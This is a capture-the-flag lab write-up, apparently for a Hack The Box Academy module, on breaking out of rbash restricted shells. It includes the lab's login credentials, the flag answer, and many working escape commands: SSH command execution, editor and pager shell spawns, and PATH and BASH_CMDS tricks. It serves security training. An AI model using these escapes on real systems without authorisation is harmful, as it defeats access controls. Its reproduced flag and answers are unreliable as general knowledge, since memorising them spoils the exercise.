# Section 7 — Escaping Restricted Shells

> Lab: `ACADEMY-LLPE-RSH` · `ssh htb-user@<T>` (`HTB_@cademy_us3r!`)

## ✅ Answer (verified live)

| Q | Answer |
|---|--------|
| Q1 — flag.txt after escaping the restricted shell | **`HTB{35c4p3_7h3_r3stricted_5h311}`** |

Login shell is **`rbash`**. The flag was read by **passing the command at SSH connect time** — the single most reliable rbash escape.

---

## What a restricted shell blocks

`rbash` / `rksh` / `rzsh` typically forbid: `cd`, setting `PATH`/`SHELL`/`ENV`, `command`/`exec`, `/` in command names (no absolute paths), and output redirection (`>`,`>>`). It only lets you run a small allow-listed set of binaries from a locked-down `PATH` (often `~/bin`).

```bash
echo $0; echo $PATH; echo $SHELL          # confirm it's r* and see the allowed PATH
ls -la ~/bin 2>/dev/null; compgen -c       # which commands ARE allowed
help                                       # bash builtins still available
```

---

## Escape #1 — SSH command/PTY (used here, most reliable remotely)

```bash
# run a command directly (skips the interactive restricted shell):
ssh htb-user@<T> 'cat flag.txt'                       # <- this got the flag
ssh htb-user@<T> 'id; ls -la; find / -name flag.txt 2>/dev/null'
# or request an unrestricted shell at connect:
ssh htb-user@<T> -t 'bash --noprofile --norc'
ssh htb-user@<T> -t '/bin/sh'
ssh htb-user@<T> -t 'python3 -c "import pty;pty.spawn(\"/bin/bash\")"'
```
> When you give `ssh` a command, sshd runs it without dropping you into the interactive restricted prompt — restricted-shell init/`PATH` enforcement that applies to the *interactive* session is sidestepped. `-t` forces a PTY so you can request a full shell. **Always try this first against a remote rbash.**

---

## Escape #2 — spawn a shell from an allowed program

If any of these are in the allowed set, they break out (GTFOBins "shell"):
```bash
vi : then  :!/bin/bash    or   :set shell=/bin/bash | :shell
vim -c ':!/bin/bash'
man x  -> !/bin/bash               # pager escape
less /etc/passwd -> !/bin/bash
awk 'BEGIN{system("/bin/bash")}'
find . -exec /bin/bash \; -quit
ed -> !/bin/bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
perl -e 'exec "/bin/bash";'
ssh-keygen -D ./x.so   (if a malicious .so allowed)  | scp -S /tmp/x.sh ...
```
> Editors/pagers/`awk`/`find`/scripting langs all have a "run a command" feature. Cross-check the allowed commands against **gtfobins.github.io** filtered by the *Shell* function.

---

## Escape #3 — shell-language tricks (when only builtins/limited bins allowed)

```bash
# command substitution / injection (the section's examples):
ls -l `pwd`            ;  echo $(/bin/cat flag.txt)
# command chaining (if ; | & permitted):
allowedcmd ; /bin/bash
# shell functions / builtins:
function x { /bin/bash; }; x
BASH_CMDS[x]=/bin/sh; x          # add a "command" via the BASH_CMDS array
# env-var abuse: set ENV/BASH_ENV/PATH/SHELL if not locked
export PATH=/bin:/usr/bin:$PATH  ;  export SHELL=/bin/bash
'/bin/bash'                       # absolute path in quotes sometimes bypasses the / filter
```
> rbash forbids `/` in command words and `PATH=` — but **command substitution `$()` / backticks aren't restricted**, builtins like `function`, arrays like `BASH_CMDS`, and inherited env (`BASH_ENV`) often still work. Once you can set `PATH`, the cage is gone.

---

## Exam / Engagement Notes

- **Remote rbash → `ssh user@host 'cmd'` or `ssh -t user@host bash` first.** It's the fastest, worked here in one shot.
- Local rbash → enumerate allowed cmds (`compgen -c`, `ls ~/bin`), find one with a GTFOBins *Shell* entry (vi/vim/less/man/awk/find/ed/python/perl) and break out.
- Language tricks when only builtins: `$()`/backticks, `function`, `BASH_CMDS[x]=`, then fix `PATH`/`SHELL`.
- After escape: re-run §1–§4 enumeration as a normal shell, then pursue real root privesc.
- Note for report: rbash is a *speed bump*, not a security boundary — any editor/pager/interpreter or SSH command exec defeats it.

---

## Lab Walkthrough (quick steps)

```
1. ssh htb-user@<T> 'echo $0; ls -la'        -> rbash, flag.txt present (root-owned, world-readable)
2. ssh htb-user@<T> 'cat flag.txt'           -> bypasses interactive rbash
   -> HTB{35c4p3_7h3_r3stricted_5h311}       ✅
   (equivalently: ssh -t htb-user@<T> 'bash --noprofile' then cat flag.txt)
```

> One line: don't fight the interactive cage — pass the command to `ssh` (or request `bash` with `-t`); restricted shells don't survive SSH command execution.
